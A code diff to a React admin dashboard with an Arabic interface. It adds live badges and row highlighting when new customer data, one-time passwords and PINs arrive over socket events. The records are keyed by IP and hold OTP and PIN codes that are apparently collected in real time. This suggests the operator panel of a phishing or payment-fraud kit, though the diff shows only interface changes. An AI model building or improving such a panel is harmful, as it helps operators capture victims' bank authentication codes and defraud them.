@@ -16,6 +16,8 @@ export default function AdminDashboard() {
   const [filterStatus, setFilterStatus] = useState('all');
   const [selectedCustomer, setSelectedCustomer] = useState(null);
   const [showDetailsModal, setShowDetailsModal] = useState(false);
+  const [newDataCount, setNewDataCount] = useState(0);
+  const [lastDataTimestamp, setLastDataTimestamp] = useState(null);
   const [stats, setStats] = useState({
     total: 0,
     active: 0,
@@ -51,14 +53,23 @@ export default function AdminDashboard() {
     });
 
     socket.on('newEntryAll', () => {
+      setNewDataCount(prev => prev + 1);
+      setLastDataTimestamp(Date.now());
       socket.emit('loadData');
+      
+      // Clear badge after 5 seconds
+      setTimeout(() => {
+        setNewDataCount(0);
+      }, 5000);
     });
 
     socket.on('newOTP', (data) => {
+      setNewDataCount(prev => prev + 1);
       setPendingOTP(data);
     });
 
     socket.on('newPIN', (data) => {
+      setNewDataCount(prev => prev + 1);
       setPendingPIN(data);
     });
 
@@ -149,7 +160,7 @@ export default function AdminDashboard() {
         otpCodes,
         pinCodes,
         status,
-        lastUpdate: lastUpdate.toISOString(),
+        lastUpdate: lastUpdate.getTime(),
         isActive
       });
     });
@@ -739,7 +750,7 @@ export default function AdminDashboard() {
           <div className="flex items-center justify-between">
             <div>
               <h1 className="text-4xl font-bold mb-3">لوحة تحكم الأدمن المتقدمة</h1>
-              <div className="flex items-center gap-3">
+              <div className="flex items-center gap-3 flex-wrap">
                 <div className="flex items-center gap-2 bg-white/20 px-4 py-2 rounded-full">
                   <div className={`w-3 h-3 rounded-full ${connected ? 'bg-green-400 animate-pulse' : 'bg-red-400'}`}></div>
                   <span className="font-semibold">{connected ? 'متصل مباشر' : 'غير متصل'}</span>
@@ -748,6 +759,12 @@ export default function AdminDashboard() {
                   <Users className="w-4 h-4" />
                   <span className="font-semibold">{stats.active} / {stats.total} نشط</span>
                 </div>
+                {newDataCount > 0 && (
+                  <div className="flex items-center gap-2 bg-green-500 px-4 py-2 rounded-full animate-pulse">
+                    <AlertCircle className="w-4 h-4" />
+                    <span className="font-bold">{newDataCount} بيانات جديدة!</span>
+                  </div>
+                )}
                 <div className="flex items-center gap-2 bg-white/20 px-4 py-2 rounded-full text-xs">
                   <Clock className="w-4 h-4" />
                   <span>تحديث تلقائي كل 5 ثواني</span>
@@ -757,10 +774,15 @@ export default function AdminDashboard() {
             <div className="flex gap-3">
               <button
                 onClick={handleRefresh}
-                className="bg-white/20 hover:bg-white/30 p-3 rounded-lg transition-colors"
+                className="bg-white/20 hover:bg-white/30 p-3 rounded-lg transition-colors relative"
                 title="تحديث"
               >
                 <RefreshCw className="w-6 h-6" />
+                {newDataCount > 0 && (
+                  <span className="absolute -top-1 -right-1 bg-red-500 text-white text-xs font-bold rounded-full w-5 h-5 flex items-center justify-center animate-bounce">
+                    {newDataCount}
+                  </span>
+                )}
               </button>
               <button
                 onClick={handleLogout}
@@ -905,8 +927,16 @@ export default function AdminDashboard() {
                 </tr>
               </thead>
               <tbody className="divide-y divide-gray-200">
-                {filteredCustomers.map((customer, idx) => (
-                  <tr key={customer.ip} className={`hover:bg-blue-50 transition-colors ${idx % 2 === 0 ? 'bg-white' : 'bg-gray-50/50'}`}>
+                {filteredCustomers.map((customer, idx) => {
+                  const isNew = lastDataTimestamp && customer.lastUpdate && 
+                                (Date.now() - customer.lastUpdate < 10000);
+                  return (
+                    <tr 
+                      key={customer.ip} 
+                      className={`hover:bg-blue-50 transition-all duration-300 ${
+                        isNew ? 'blink-green-text' : ''
+                      } ${idx % 2 === 0 ? 'bg-white' : 'bg-gray-50/50'}`}
+                    >
                     <td className="px-4 py-4">
                       <div className="flex items-center gap-2">
                         <div className={`w-3 h-3 rounded-full ${customer.isActive ? 'bg-green-500 animate-pulse shadow-lg shadow-green-300' : 'bg-gray-300'}`}></div>
@@ -996,7 +1026,8 @@ export default function AdminDashboard() {
                       </button>
                     </td>
                   </tr>
-                ))}
+                  );
+                })}
               </tbody>
             </table>
           </div>
